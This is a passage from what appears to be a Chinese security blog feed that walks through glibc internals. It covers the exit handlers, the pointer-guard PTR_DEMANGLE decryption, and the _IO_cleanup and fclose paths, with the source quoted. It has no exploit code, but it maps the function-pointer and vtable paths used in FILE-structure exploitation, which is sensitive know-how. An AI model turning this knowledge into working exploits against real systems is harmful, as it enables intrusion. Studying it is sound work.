class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">             <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line">        &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">      <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">          <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">          <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ef_free:</span><br><span class="line">        <span class="keyword">case</span> ef_us:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_on:</span><br><span class="line">          onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          onfct (status, f-&gt;func.on.arg);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_at:</span><br><span class="line">          atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          atfct ();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">          cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">       allocate element.  */</span></span><br><span class="line">    <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="call-tls-dtors"><a href="#call-tls-dtors" class="headerlink" title="__call_tls_dtors()"></a>__call_tls_dtors()</h4><p>stdlib&#x2F;cxa_thread_atexit_impl.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">     potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>注释写的很清楚，当线程从调用初始函数返回时或进程通过exit函数退出时调用，释放线程局部储存</p><p><code>tls_dtor_list</code> 是多线程程序中的线程本地存储析构函数列表。<code>tls_dtor_list</code> 维护了所有需要在线程退出时被调用的析构函数的指针列表。这个列表会在程序运行时动态地进行修改和更新。</p><p>我们的示例程序并没有，直接return了</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>没什么好说的，不断遍历去根据类型，利用函数指针去调用__exit_funcs里的析构函数，释放掉结构体内存</p><p>不过这里涉及到一个解密操作</p><p><img src="/2023/04/02/exit/image-20230402210547276.png" alt="image-20230402210547276"></p><p>这个函数地址非常怪，不是正常值</p><p>会利用PTR_DEMANGLE这个解密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)    asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">                              pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>循环右移和异或解密，异或的这个key来自tcbhead_t 0x30偏移处，之前tsl hijack时操作的0x28处的canary</p><p><img src="/2023/04/02/exit/image-20230402211644558.png" alt="image-20230402211644558"></p><p><img src="/2023/04/02/exit/image-20230402211610883.png" alt="image-20230402211610883"></p><p>ror后</p><p><img src="/2023/04/02/exit/image-20230402211718281.png" alt="image-20230402211718281"></p><p>xor后</p><p><img src="/2023/04/02/exit/image-20230402212201065.png" alt="image-20230402212201065"></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>_dl_fini函数源码分析</p><h3 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h3><p>__exit_funcs是怎么初始化的</p><h3 id="RUN-HOOK-libc-atexit"><a href="#RUN-HOOK-libc-atexit" class="headerlink" title="RUN_HOOK (__libc_atexit, ())"></a>RUN_HOOK (__libc_atexit, ())</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IO-flush-all-lockp-o"><a href="#IO-flush-all-lockp-o" class="headerlink" title="_IO_flush_all_lockp(o)"></a>_IO_flush_all_lockp(o)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果定义了 _IO_MTSAFE_IO 宏，就开始一个清理区域的操作，并在需要时加锁 list_all_lock</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录当前 _IO_list_all 的时间戳，从头遍历所有打开的文件指针</span></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 保存当前处理的文件指针，如果需要加锁就进行加锁操作</span></span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果当前文件指针是写模式并且有数据要输出，或者是宽字符模式并且有宽字符数据要输出，就进行输出操作</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果需要加锁就进行解锁操作，同时清空 run_fp 变量</span></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 _IO_list_all 的时间戳已经改变，说明有新的文件指针被添加进去了，需要重新从头遍历</span></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">          fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">          last_stamp = _IO_list_all_stamp;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp = fp-&gt;_chain; <span class="comment">// 否则继续处理下一个文件指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果定义了 _IO_MTSAFE_IO 宏，就解锁 list_all_lock，同时结束清理区域的操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所有打开的文件指针的缓冲区中的数据输出，并清空缓冲区。函数的返回值为 <code>0</code> 或 <code>EOF</code>，表示输出是否成功。函数参数 <code>do_lock</code> 表示是否需要对文件指针加锁操作。函数主要采用了循环遍历 _IO_list_all 链表的方式来处理所有打开的文件指针。其中，如果定义了 <code>_IO_MTSAFE_IO</code> 宏，则使用了线程安全的加锁和解锁操作。</p><p>函数里调用_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>调用虚表中的__overflow，即_IO_new_file_overflow函数，第一参数_IO_FILE文件流结构体，第二个参数 EOF(-1)</p><p>fwrite分析过，会来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">     f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/02/exit/image-20230402224531539.png" alt="image-20230402224531539"></p><p><img src="/2023/04/02/exit/image-20230402224604948.png" alt="image-20230402224604948"></p><p><img src="/2023/04/02/exit/image-20230402224642501.png" alt="image-20230402224642501"></p><p>调用了vtable中__write对应的<code>_IO_new_file_write</code></p><p>执行系统调用write把数据写入文件</p><p><img src="/2023/04/02/exit/image-20230402230052468.png" alt="image-20230402230052468"></p><h4 id="IO-unbuffer-all"><a href="#IO-unbuffer-all" class="headerlink" title="_IO_unbuffer_all"></a>_IO_unbuffer_all</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">      &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">         stream.  */</span></span><br><span class="line">          __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">        &#123;</span><br><span class="line">          fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">          fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">          freeres_list = fp;</span><br><span class="line">          fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">        _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">     used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_SETBUF (fp, NULL, 0)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(*FP*, *BUFFER*, *LENGTH*) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br></pre></td></tr></table></figure><p><strong>! (fp-&gt;_flags &amp; _IO_UNBUFFERED) &amp;&amp; fp-&gt;_mode !&#x3D; 0</strong></p><p>循环调用每个文件流的<mark>&#x3D;&#x3D;vatble里__setbuf对应的_IO_new_file_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_setbuf _IO_file_setbuf</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYNC(FP) JUMP0 (__sync, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable __sync 对应的_IO_default_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>取消所有缓冲区，包括标准I&#x2F;O流和用户打开的文件流，以便文件的所有数据都立即被写入磁盘而不会留在缓冲区中。它遍历所有的_IO_FILE对象，并检查它们是否已被缓冲，如果是，则取消缓冲，并设置_IO_FILE对象的标志以指示它们已被缓冲。它还将_IO_FILE对象的模式设置为-1，以确保不再使用宽字符函数。在多线程环境下，代码使用锁来确保线程安全。</p><h2 id="内核层面"><a href="#内核层面" class="headerlink" title="内核层面"></a>内核层面</h2><h3 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h3><p>最后调用_exit系统调用销毁进程</p><ol><li><code>_exit</code>会立刻中断当前进程</li><li>关闭所有属于该进程的文件</li><li>将该进程的所有子进程移交给<code>init</code>进程</li><li>给该进程的父进程发送<code>SIGCHLD</code>信号</li><li><code>_exit</code>的参数<code>status</code>会被返回给父进程，可以被父进程的<code>wait</code>函数接收。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>用户层面：释放TLS，需要释放libc中的流缓冲区, 退出前清空下stdout的缓冲区</p><p>内核层面：释放掉这个进程打开的文件描述符, 释放掉task结构体,有资源都被释放完毕后, 内核会从调度队列从取出这个任务，然后向父进程发送一个信号, 表示有一个子进程终止，此时这个进程才算是真正结束</p><p>进程终止&#x3D;释放所有占有资源+cpu不在分配时间片给</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fclose</title>
      <link href="/2023/04/01/IO-FILE-fclose/"/>
      <url>/2023/04/01/IO-FILE-fclose/</url>
      
        <content type="html"><![CDATA[<p>感谢raycp师傅:<a href="https://xz.aliyun.com/t/5445">https://xz.aliyun.com/t/5445</a></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>] = <span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">0x20</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断点断到执行到fclose，缓冲区已经初始化</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401212041052.png" alt="image-20230401212041052"></p><h2 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h2><p><strong>include&#x2F;stdio.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fclose(fp) _IO_new_fclose(fp)</span></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofclose.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span 